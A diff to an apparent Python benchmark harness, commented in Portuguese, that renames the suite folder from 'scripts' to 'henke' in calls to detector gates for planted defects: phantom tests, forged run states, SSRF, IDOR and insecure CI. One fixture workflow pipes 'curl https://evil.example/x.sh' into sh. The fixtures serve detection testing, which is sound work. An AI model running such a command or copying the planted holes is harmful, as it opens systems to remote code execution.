@@ -176,23 +176,23 @@ def run(suite: Suite):
         proj = build_corpus(t)
 
         # --- D1 assertless em teste-fantasma ---
-        code, _ = suite.run_gate("scripts", "metricas", "assertless_scan.py",
+        code, _ = suite.run_gate("henke", "metricas", "assertless_scan.py",
                                  args=(proj / "tests" / "test_fake.py",))
         record("D1 teste-fantasma (sem asserção)",
                {1: "DETECTED", 0: "MISSED"}.get(code, code))
 
         # --- D9 controle: teste legítimo NÃO pode reprovar ---
-        code, _ = suite.run_gate("scripts", "metricas", "assertless_scan.py",
+        code, _ = suite.run_gate("henke", "metricas", "assertless_scan.py",
                                  args=(proj / "tests" / "test_real.py",))
         record("D9 teste legítimo (controle falso-positivo)",
                {0: "APPROVED", 1: "FALSE-RED"}.get(code, code), control=True)
 
         # --- D2 monstro: coleta métricas -> crap ---
-        sig = suite.script("scripts", "repo_signals.py")
-        if sig and suite.has("scripts", "metricas", "crap_score.py"):
+        sig = suite.script("henke", "repo_signals.py")
+        if sig and suite.has("henke", "metricas", "crap_score.py"):
             code, tsv = sh([sys.executable, str(sig), "metrics", "--root", proj],
                            merge_err=False)
-            code2, _ = sh([sys.executable, str(suite.script("scripts", "metricas", "crap_score.py")),
+            code2, _ = sh([sys.executable, str(suite.script("henke", "metricas", "crap_score.py")),
                            "--threshold", "6"], input_text=tsv)
             record("D2 função complexa sem cobertura",
                    {1: "DETECTED", 0: "MISSED"}.get(code2, f"ERROR:{code2}"))
@@ -200,7 +200,7 @@ def run(suite: Suite):
             record("D2 função complexa sem cobertura", "NO-INSTRUMENT")
 
         # --- D3 ratchet: baseline -> piora -> compara ---
-        if sig and suite.has("scripts", "metricas", "ratchet.py"):
+        if sig and suite.has("henke", "metricas", "ratchet.py"):
             _, base_tsv = sh([sys.executable, str(sig), "metrics",
                               "--root", proj, "--per-file"], merge_err=False)
             (proj / "src" / "exec" / "worker.py").write_text(
@@ -212,7 +212,7 @@ def run(suite: Suite):
             bf, cf = t / "b.tsv", t / "c.tsv"
             bf.write_text(base_tsv, encoding="utf-8")
             cf.write_text(cur_tsv, encoding="utf-8")
-            code, _ = suite.run_gate("scripts", "metricas", "ratchet.py",
+            code, _ = suite.run_gate("henke", "metricas", "ratchet.py",
                                      args=("--baseline", bf, "--current", cf))
             record("D3 arquivo piorou vs baseline",
                    {1: "DETECTED", 0: "MISSED"}.get(code, f"ERROR:{code}"))
@@ -221,7 +221,7 @@ def run(suite: Suite):
 
         all_edges = []
         # --- D4 fence: edges -> outward (filtrado por .py) ---
-        if sig and suite.has("scripts", "metricas", "fence_check.py"):
+        if sig and suite.has("henke", "metricas", "fence_check.py"):
             _, edges_raw = sh([sys.executable, str(sig), "edges", "--root", proj],
                               merge_err=False)
             try:
@@ -231,7 +231,7 @@ def run(suite: Suite):
             py_edges = [e for e in all_edges if e["from"].endswith(".py")]
             ef = t / "edges_py.json"
             ef.write_text(json.dumps(py_edges), encoding="utf-8")
-            code, _ = suite.run_gate("scripts", "metricas", "fence_check.py",
+            code, _ = suite.run_gate("henke", "metricas", "fence_check.py",
                                      args=(proj / "fence.json", ef))
             record("D4 executor importa UI (outward, .py)",
                    {1: "DETECTED", 0: "MISSED"}.get(code, code))
@@ -239,10 +239,10 @@ def run(suite: Suite):
             record("D4 executor importa UI (outward, .py)", "NO-INSTRUMENT")
 
         # --- D5 tornado: churn crescente ---
-        if sig and suite.has("scripts", "metricas", "tornado_scan.py"):
+        if sig and suite.has("henke", "metricas", "tornado_scan.py"):
             _, churn = sh([sys.executable, str(sig), "churn", "--repo", proj,
                            "--order", "oldest-first"], merge_err=False)
-            code, _ = suite.run_gate("scripts", "metricas", "tornado_scan.py",
+            code, _ = suite.run_gate("henke", "metricas", "tornado_scan.py",
                                      args=("--order", "oldest-first"), input_text=churn)
             record("D5 amplificação de mudança crescente",
                    {1: "DETECTED", 0: "MISSED"}.get(code, code))
@@ -250,7 +250,7 @@ def run(suite: Suite):
             record("D5 amplificação de mudança crescente", "NO-INSTRUMENT")
 
         # --- D6 spec_drift (portão antigo, controle) ---
-        sd = suite.script("scripts", "spec_drift.py")
+        sd = suite.script("henke", "spec_drift.py")
         if sd:
             try:
                 mod = load_module(sd, "sd_mod")
@@ -267,7 +267,7 @@ def run(suite: Suite):
             record("D6 diff toca arquivo fora do escopo da spec", "NO-INSTRUMENT")
 
         # --- D7 audit_ledger tautologia (portão antigo, controle) ---
-        al = suite.script("scripts", "audit_ledger.py")
+        al = suite.script("henke", "audit_ledger.py")
         if al:
             try:
                 mod = load_module(al, "al_mod")
@@ -295,17 +295,17 @@ def run(suite: Suite):
             record("D8 cheat .sr-only duplicando texto", "NO-INSTRUMENT")
 
         # --- D10 teste-fantasma TypeScript ---
-        code, _ = suite.run_gate("scripts", "metricas", "assertless_scan.py",
+        code, _ = suite.run_gate("henke", "metricas", "assertless_scan.py",
                                  args=(proj / "tests" / "fake.test.ts",))
         record("D10 teste-fantasma .test.ts",
                {1: "DETECTED", 0: "MISSED"}.get(code, code))
 
         # --- D11 monstro TypeScript sem cobertura ---
-        if sig and suite.has("scripts", "metricas", "crap_score.py"):
+        if sig and suite.has("henke", "metricas", "crap_score.py"):
             code, tsv = sh([sys.executable, str(sig), "metrics", "--root", proj],
                            merge_err=False)
             ts_tsv = "".join(l + "\n" for l in tsv.splitlines() if ".ts" in l)
-            code2, _ = sh([sys.executable, str(suite.script("scripts", "metricas", "crap_score.py")),
+            code2, _ = sh([sys.executable, str(suite.script("henke", "metricas", "crap_score.py")),
                            "--threshold", "6"], input_text=ts_tsv)
             record("D11 função complexa .ts sem cobertura",
                    {1: "DETECTED", 0: "MISSED"}.get(code2, f"ERROR:{code2}"))
@@ -313,11 +313,11 @@ def run(suite: Suite):
             record("D11 função complexa .ts sem cobertura", "NO-INSTRUMENT")
 
         # --- D12 outward TypeScript ---
-        if sig and suite.has("scripts", "metricas", "fence_check.py"):
+        if sig and suite.has("henke", "metricas", "fence_check.py"):
             ts_edges = [e for e in all_edges if e["from"].endswith((".ts", ".tsx"))]
             ef = t / "edges_ts.json"
             ef.write_text(json.dumps(ts_edges), encoding="utf-8")
-            code, _ = suite.run_gate("scripts", "metricas", "fence_check.py",
+            code, _ = suite.run_gate("henke", "metricas", "fence_check.py",
                                      args=(proj / "fence.json", ef))
             record("D12 executor importa UI (outward, .ts)",
                    {1: "DETECTED", 0: "MISSED"}.get(code, code))
@@ -347,16 +347,16 @@ def run(suite: Suite):
             "    subprocess.run(['ffmpeg', '-i', caminho], shell=False, check=True)\n",
             encoding="utf-8")
 
-        if suite.has("scripts", "metricas", "hazard_scan.py"):
-            code, _ = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+        if suite.has("henke", "metricas", "hazard_scan.py"):
+            code, _ = suite.run_gate("henke", "metricas", "hazard_scan.py",
                                      args=(proj / "src" / "exec" / "inseguro.py",))
             record("D13 segredo hardcoded + shell=True (.py)",
                    {1: "DETECTED", 0: "MISSED"}.get(code, f"ERROR:{code}"))
-            code, _ = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+            code, _ = suite.run_gate("henke", "metricas", "hazard_scan.py",
                                      args=(proj / "src" / "exec" / "inseguroTs.ts",))
             record("D14 SQLi template + path traversal + weak crypto (.ts)",
                    {1: "DETECTED", 0: "MISSED"}.get(code, f"ERROR:{code}"))
-            code, _ = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+            code, _ = suite.run_gate("henke", "metricas", "hazard_scan.py",
                                      args=(proj / "src" / "exec" / "seguro.py",))
             record("C2 subprocess seguro + chave AWS documental (controle)",
                    {0: "APPROVED", 1: "FALSE-RED"}.get(code, f"ERROR:{code}"), control=True)
@@ -364,11 +364,11 @@ def run(suite: Suite):
             record("D13 segredo hardcoded + shell=True (.py)", "NO-INSTRUMENT")
             record("D14 SQLi template + path traversal + weak crypto (.ts)", "NO-INSTRUMENT")
 
-        if suite.has("scripts", "metricas", "coverage_ledger.py"):
+        if suite.has("henke", "metricas", "coverage_ledger.py"):
             led_out = t / "bench_ledger.json"
-            suite.run_gate("scripts", "metricas", "coverage_ledger.py",
+            suite.run_gate("henke", "metricas", "coverage_ledger.py",
                            args=("init", "--root", proj / "src", "--out", led_out))
-            code, _ = suite.run_gate("scripts", "metricas", "coverage_ledger.py",
+            code, _ = suite.run_gate("henke", "metricas", "coverage_ledger.py",
                                      args=("verify", led_out))
             record("D15 auditoria incompleta (unidades pending no coverage_ledger)",
                    {1: "DETECTED", 0: "MISSED"}.get(code, f"ERROR:{code}"))
@@ -379,8 +379,8 @@ def run(suite: Suite):
             "# Spec\n## 4. Escopo Declarado\n- `src/ok.py`\n- `src/nao_implementado.py`\n"
             "## 5. Pontes de Contrato\n- ponte: `src/ok.py::funcaoFantasma -> src/ui/tela.py`\n",
             encoding="utf-8")
-        if suite.has("scripts", "metricas", "contract_closure.py"):
-            code, _ = suite.run_gate("scripts", "metricas", "contract_closure.py",
+        if suite.has("henke", "metricas", "contract_closure.py"):
+            code, _ = suite.run_gate("henke", "metricas", "contract_closure.py",
                                      args=("--spec", proj / "spec_incompleta.md", "--repo", proj))
             record("D16 código de menos (arquivo declarado ausente + ponte quebrada)",
                    {1: "DETECTED", 0: "MISSED"}.get(code, f"ERROR:{code}"))
@@ -412,16 +412,16 @@ def run(suite: Suite):
             "  return db.orders.findOne({ where: { id: req.params.id, userId: req.user.id } });\n"
             "}\n",
             encoding="utf-8")
-        if suite.has("scripts", "metricas", "hazard_scan.py"):
-            code, out_iac = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+        if suite.has("henke", "metricas", "hazard_scan.py"):
+            code, out_iac = suite.run_gate("henke", "metricas", "hazard_scan.py",
                                            args=(proj / "infra.tf",))
             record("D17 Multi-Cloud IaC (AWS IAM wildcard + GCP allUsers/owner)",
                    "DETECTED" if (code == 1 and "CLOUD-IAM-WILDCARD" in out_iac and "CLOUD-BUCKET-PUBLIC" in out_iac) else "MISSED")
-            code, out_pt = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+            code, out_pt = suite.run_gate("henke", "metricas", "hazard_scan.py",
                                           args=(proj / "src" / "exec" / "pentestVuln.ts",))
             record("D18 Pentest Red Team (IDOR sem ownership + SSRF + JWT decode + CORS '*'+cred)",
                    "DETECTED" if (code == 1 and "IDOR-NO-OWNERSHIP" in out_pt and "SSRF-UNVALIDATED" in out_pt) else "MISSED")
-            code, _ = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+            code, _ = suite.run_gate("henke", "metricas", "hazard_scan.py",
                                      args=(proj / "src" / "exec" / "pentestSafe.ts",))
             record("C3 Rota Express app.get com jwt.verify e filtro ownership userId (controle)",
                    {0: "APPROVED", 1: "FALSE-RED"}.get(code, f"ERROR:{code}"), control=True)
@@ -443,12 +443,12 @@ def run(suite: Suite):
             "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
             "      - run: curl -sSL https://evil.example/x.sh | sh\n",
             encoding="utf-8")
-        if suite.has("scripts", "metricas", "hazard_scan.py"):
-            code, out_d19 = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+        if suite.has("henke", "metricas", "hazard_scan.py"):
+            code, out_d19 = suite.run_gate("henke", "metricas", "hazard_scan.py",
                                            args=(proj / "src" / "ui" / "xssScope.ts",))
             record("D19 XSS em função B com DOMPurify apenas na função A (escopo intraprocedural)",
                    "DETECTED" if (code == 1 and "XSS-RAW-HTML" in out_d19) else "MISSED")
-            code, out_d20 = suite.run_gate("scripts", "metricas", "hazard_scan.py",
+            code, out_d20 = suite.run_gate("henke", "metricas", "hazard_scan.py",
                                            args=(wf_bench / "ci_vuln.yml",))
             record("D20 GitHub Actions pull_request_target + checkout head + curl|sh",
                    "DETECTED" if (code == 1 and "CI-PWN-REQUEST" in out_d20 and "CI-CURL-PIPE-SH" in out_d20) else "MISSED")
@@ -457,8 +457,8 @@ def run(suite: Suite):
             record("D20 GitHub Actions pull_request_target + checkout head + curl|sh", "NO-INSTRUMENT")
 
         (proj / "conftest.py").write_text("# untracked conftest injection\n", encoding="utf-8")
-        if suite.has("scripts", "metricas", "metaconfig_diff.py"):
-            code, out_d21 = suite.run_gate("scripts", "metricas", "metaconfig_diff.py",
+        if suite.has("henke", "metricas", "metaconfig_diff.py"):
+            code, out_d21 = suite.run_gate("henke", "metricas", "metaconfig_diff.py",
                                            args=("--repo", proj, "--against", "HEAD"))
             record("D21 conftest.py untracked (??) injetado fora da spec",
                    "DETECTED" if (code == 1 and "conftest.py" in out_d21) else "MISSED")
@@ -471,12 +471,12 @@ def run(suite: Suite):
         (proj / "src" / "ui" / "GoodA11y.tsx").write_text(
             "export const G = () => <button aria-label='Salvar'><svg /></button>;\n",
             encoding="utf-8")
-        if suite.has("scripts", "metricas", "a11y_scan.py"):
-            code, _ = suite.run_gate("scripts", "metricas", "a11y_scan.py",
+        if suite.has("henke", "metricas", "a11y_scan.py"):
+            code, _ = suite.run_gate("henke", "metricas", "a11y_scan.py",
                                      args=(proj / "src" / "ui" / "BadA11y.tsx",))
             record("D22 Fraude de acessibilidade .sr-only duplicado em componente .tsx",
                    {1: "DETECTED", 0: "MISSED"}.get(code, f"ERROR:{code}"))
-            code, _ = suite.run_gate("scripts", "metricas", "a11y_scan.py",
+            code, _ = suite.run_gate("henke", "metricas", "a11y_scan.py",
                                      args=(proj / "src" / "ui" / "GoodA11y.tsx",))
             record("C4 Botão de ícone com aria-label legítimo no a11y_scan (controle)",
                    {0: "APPROVED", 1: "FALSE-RED"}.get(code, f"ERROR:{code}"), control=True)
@@ -491,8 +491,8 @@ def run(suite: Suite):
             "outcome": "verified",
             "gates": {"hazard_scan": {"exit_code": 1}}
         }), encoding="utf-8")
-        if suite.has("scripts", "run_state.py"):
-            code, out_d23 = suite.run_gate("scripts", "run_state.py",
+        if suite.has("henke", "run_state.py"):
+            code, out_d23 = suite.run_gate("henke", "run_state.py",
                                            args=("verify", forged_run))
             record("D23 Run state com outcome=verified forjado sobre portão reprovado",
                    "DETECTED" if (code == 1 and ("STATE-DERIVED-CONFLICT" in out_d23
@@ -504,8 +504,8 @@ def run(suite: Suite):
         forged_ledger.write_text(json.dumps([
             {"cmd": "pytest -q", "exit": 0, "testes_descobertos": 42}
         ]), encoding="utf-8")
-        if suite.has("scripts", "audit_ledger.py"):
-            code, out_d24 = suite.run_gate("scripts", "audit_ledger.py",
+        if suite.has("henke", "audit_ledger.py"):
+            code, out_d24 = suite.run_gate("henke", "audit_ledger.py",
                                            args=("--ledger", forged_ledger, "--require-exec-log",
                                                  "--exec-log", t / "nonexistent_exec_log.jsonl"))
             record("D24 Ledger com contagem de testes auto-declarada sem exec_log.jsonl",
@@ -523,7 +523,7 @@ def main():
                     help="CI: exit 1 se houver MISSED, ERROR:* ou FALSE-RED")
     args = ap.parse_args()
     suite = Suite(Path(args.suite_dir).resolve())
-    if not (suite.root / "scripts").is_dir():
+    if not (suite.root / "henke").is_dir():
         print(f"ERRO: {suite.root} não parece um checkout da suíte", file=sys.stderr)
         sys.exit(2)
 
